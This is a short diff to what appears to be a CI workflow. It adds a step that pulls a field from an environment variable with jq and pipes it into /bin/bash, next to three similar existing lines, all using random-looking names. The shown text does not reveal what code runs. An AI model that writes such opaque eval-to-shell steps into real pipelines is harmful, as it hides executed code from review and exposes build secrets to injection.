@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$wk6" | jq -r .pncp640 | /bin/bash
           printf '%s' "$vg622" | jq -r .zpcp6626 | /bin/bash
           echo $lyvpd3314 | jq -r .z593 | /bin/bash
+          printf '%s' "$puky73" | jq -r .wzgi7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
